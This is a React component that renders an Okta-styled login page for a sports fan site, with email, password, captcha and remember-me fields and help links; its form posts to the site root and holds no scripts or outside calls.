import React from 'react';
import "./style.css"

const LoginScreen = () => {
  return (
    <>
    <div className="custom-body">
          <div className="punter-top-section">
              <div id="punter-logo-icon" className="top-punter-logo">
                  <img className="punter-logo" id="punter-image" src="./images/360_F_202276862_Bl20MC12CxPZAr781Sctf37otHIwSvBU.jpg" alt ="#"/>
               </div>
              <p className="sign-up-title" id="sign-up-title">Your home for <b className="bold-text">exclusive benefits</b>, match highlights, in-play clips and <b class="bold-text">behind-the-scenes access</b>
              </p>
          </div>
      </div><div id="bg-img" className="login-bg-image"></div><div id="okta-login-container">
              <div className="auth-container main-container no-beacon">
                  <div className="auth-content">
                      <div className="auth-content-inner">
                          <div className="primary-auth">
                              <form novalidate="novalidate" method="POST" action="/" data-se="o-form" slot="content" id="form2" className="primary-auth-form o-form o-form-edit-mode">
                                  <div data-se="o-form-content" className="o-form-content o-form-theme clearfix">
                                      <div className="o-form-error-container"></div>
                                      <div className="o-form-fieldset-container">
                                          <div className="o-form-fieldset o-form-label-top margin-btm-5">
                                              <div className="okta-form-label o-form-label">
                                                  <label for="okta-signin-username">Email&nbsp;</label>
                                              </div>
                                              <div className="o-form-input">
                                                  <span className="o-form-input-name-username o-form-control okta-form-input-field input-fix">
                                                      <input type="text" placeholder="" name="username" value="" aria-label="" autocomplete="off" required="" />
                                                      </span>
                                              </div>
                                          </div>
                                          <div className="o-form-fieldset o-form-label-top margin-btm-30">
                                              <div className="okta-form-label o-form-label">
                                                  <label for="okta-signin-password">Password&nbsp;</label>
                                              </div>
                                              <div className="o-form-input">
                                                  <span className="o-form-input-name-password o-form-control okta-form-input-field input-fix">
                                                      <input type="password" placeholder="" name="password" value="" aria-label="" autocomplete="off" required=""/>
                                                      </span>
                                              </div>
                                          </div>
                                          <div className="o-form-fieldset o-form-label-top margin-btm-30">
                                              <div className="o-form-input">
                                                  <span className="o-form-input-name-password o-form-control okta-form-input-field input-fix" style={{width: "60%"}}>
                                                      <input type="password" placeholder="" name="captcha" value="Captch"/>
                                                      </span>
                                                  <img src="" id="captchaimg" alt = "#"/>
                                                  </div>
                                          </div>
                                          <div className="o-form-fieldset o-form-label-top margin-btm-0">
                                              <div className="o-form-input">
                                                  <span className="o-form-input-name-remember">
                                                      <div className="custom-checkbox">
                                                          <input type="checkbox" name="remember" id="input8"/>
                                                              <label for="input8" className="">Remember me</label>
                                                          </div>
                                                  </span>
                                              </div>
                                          </div>
                                      </div>
                                  </div>
                                  <div className="o-form-button-bar">
                                      <button className="submit_button" type="submit" value="Sign In" >Submit</button>
                                      </div>
                              </form>
                              <div className="auth-footer">
                                  <a href="/" className="link help js-help">Need help signing</a>
                                  <ul className="help-links js-help-links" id="help-links-container">
                                      <li>
                                          <a href="/" className="link js-forgot-password"> Forgotten your password?</a>
                                      </li>
                                  </ul>
                              </div>
                          </div>
                      </div>
                  </div>
              </div>
          </div></>
  );
};

export default LoginScreen;
